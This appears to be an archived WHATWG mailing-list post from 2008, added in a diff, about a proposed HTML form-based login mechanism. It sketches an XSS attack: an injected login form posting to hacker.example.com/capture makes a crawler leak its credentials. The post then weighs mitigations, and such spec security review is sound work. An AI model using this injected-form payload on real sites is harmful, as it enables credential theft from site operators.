@@ -1,0 +1,155 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [whatwg] Solving the login/logout problem in HTML
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Solving%20the%20login/logout%20problem%20in%20HTML&In-Reply-To=%3Cea09c0d10811260857u7282c269ic641313dd1ec4d41%40mail.gmail.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="017564.html">
+   <LINK REL="Next"  HREF="017529.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[whatwg] Solving the login/logout problem in HTML</H1>
+<!--htdig_noindex-->
+    <B>Philip Taylor</B> 
+    <A HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Solving%20the%20login/logout%20problem%20in%20HTML&In-Reply-To=%3Cea09c0d10811260857u7282c269ic641313dd1ec4d41%40mail.gmail.com%3E"
+       TITLE="[whatwg] Solving the login/logout problem in HTML">excors+whatwg at gmail.com
+       </A><BR>
+    <I>Wed Nov 26 08:57:48 PST 2008</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="017564.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+        <LI>Next message: <A HREF="017529.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#17518">[ date ]</a>
+              <a href="thread.html#17518">[ thread ]</a>
+              <a href="subject.html#17518">[ subject ]</a>
+              <a href="author.html#17518">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--/htdig_noindex-->
+<!--beginarticle-->
+<PRE>On Wed, Nov 26, 2008 at 10:12 AM, Ian Hickson &lt;<A HREF="http://lists.whatwg.org/listinfo.cgi/whatwg-whatwg.org">ian at hixie.ch</A>&gt; wrote:
+&gt;<i> On Wed, 26 Nov 2008, Julian Reschke wrote:
+</I>&gt;&gt;<i> Ian Hickson wrote:
+</I>&gt;&gt;<i> &gt; ...
+</I>&gt;&gt;<i> &gt; As can be seen in the feedback below, there is interest in improving the So
+</I>&gt;&gt;<i> &gt; when you get to a page that expects you to be logged in, it return a 401
+</I>&gt;&gt;<i> &gt; with:
+</I>&gt;&gt;<i> &gt;
+</I>&gt;&gt;<i> &gt;    WWW-Authenticate: HTML form=&quot;login&quot;
+</I>&gt;&gt;<i> &gt;
+</I>&gt;&gt;<i> &gt; ...and there must be a &lt;form&gt; element with name=&quot;login&quot;, which represents
+</I>&gt;&gt;<i> &gt; the form that must be submitted to log in.
+</I>&gt;&gt;<i> &gt; ...
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> For security reasons, I'd prefer that to be &quot;the &lt;form&gt; element&quot;,
+</I>&gt;&gt;<i> instead of &quot;a &lt;form&gt; element&quot; -- having multiple copies of the name in
+</I>&gt;&gt;<i> the same document should be considered a fatal error.
+</I>&gt;<i>
+</I>&gt;<i> Having multiple &lt;form&gt; elements with the same name is already an error.
+</I>&gt;<i>
+</I>&gt;<i> I'm not sure what you mean by &quot;fatal&quot; error. The spec precisely defines
+</I>&gt;<i> which form should be used in the case of multiple forms with the same
+</I>&gt;<i> name. Could you describe the attack scenario you are considering?
+</I>
+If I'm not misunderstanding things, there is a new attack scenario:
+
+I post a comment on someone's blog, saying &lt;a
+href=&quot;/restricted-access.php?xsshole=&lt;form
+action=<A HREF="http://hacker.example.com/capture">http://hacker.example.com/capture</A> name=login&gt;&lt;input
+name=username&gt;&lt;input name=password&gt;&lt;/form&gt;&quot;&gt;crawl me!&lt;/a&gt;
+
+On their blog's web server, restricted-access.php require
+authentication, and unauthenticated access results in a 401 with
+'WWW-Authenticate: HTML form=&quot;login&quot;' and the appropriate login form.
+But inevitably there's some kind of XSS hole in that page, so
+arbitrary markup can be inserted above the real login form. (Maybe
+they pass an error message in a parameter, which will be displayed
+above the form, but they forgot to escape the output.)
+
+Their internal search engine crawler is configured to know a username
+and password (and the form field names etc) for these restricted
+areas. It follows the link from my blog comment, it notices the
+WWW-Authenticate header, and like a good little bot it chooses to
+parse the HTML page and find the matching form and fill in the fields
+and submit the login details. But actually it's submitting my
+XSS-inserted form, and sending the login details to me.
+
+XSS holes already cause various security vulnerabilities; but they
+can't currently result in sensibly-written crawlers unwittingly
+submitting their login details to arbitrary third parties, so this is
+a new risk.
+
+I can imagine a few ways to avoid this problem:
+
+ 1) Don't write any pages with XSS holes.
+ 2) Detect tampering by refusing to submit login details if &gt;= 2 forms
+match the name.
+ 3) Only submit login details to same-origin URLs, or to some other
+restricted set.
+ 4) Configure the crawler with the form submission URL, as well as the
+form field names and values, so it doesn't have to trust the HTML.
+ 5) Change WWW-Authenticate so it gives all the details (submission
+URL, field names, etc), so nobody has to trust the HTML.
+
+But (1) is not going to happen in reality, so we should try to
+minimise the damage when XSS holes exist. (2) won't work because the
+attacker could write '...?xsshole=...&lt;!--' and the second form would
+be hidden. (3) is more sensible; perhaps the spec should explicitly
+note that you need to be quite careful about not submitting login
+forms to third-party sites unless you're sure you trust them?
+
+But even with (3), I could write &lt;a
+href=&quot;/restricted-access.php?xsshole=&lt;form
+action=/public-pastebin.php&gt;...&quot;&gt; and the crawler would send the login
+details to somewhere on the same host where I could still read them
+back, which doesn't seem great.
+
+So (4) is more sensible. You already have to configure the crawler
+with the form field names, so you might as well tell it what URL to
+submit to, and it shouldn't parse the HTML response or care about the
+&lt;form&gt; element. (Then there's no need for WWW-Authenticate to even say
+what the form name is.)
+
+(5) is basically the same, except it's late-binding the form details
+rather than hardcoding them into the crawler's configuration, and so
+it makes it easy to change the server-side login handling without
+reconfiguring everyone's crawlers.
+
+(But the cost of the potential solutions to the vulnerability might be
+greater than the cost of the vulnerability, so it might not be worth
+doing anything - I don't have a useful opinion on that.)
+
+-- 
+Philip Taylor
+<A HREF="http://lists.whatwg.org/listinfo.cgi/whatwg-whatwg.org">excors at gmail.com</A>
+
+</PRE>
+
+<!--endarticle-->
+<!--htdig_noindex-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="017564.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+	<LI>Next message: <A HREF="017529.html">[whatwg] Solving the login/logout problem in HTML
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#17518">[ date ]</a>
+              <a href="thread.html#17518">[ thread ]</a>
+              <a href="subject.html#17518">[ subject ]</a>
+              <a href="author.html#17518">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.whatwg.org/listinfo.cgi/whatwg-whatwg.org">More information about the whatwg
+mailing list</a><br>
+<!--/htdig_noindex-->
+</body></html>
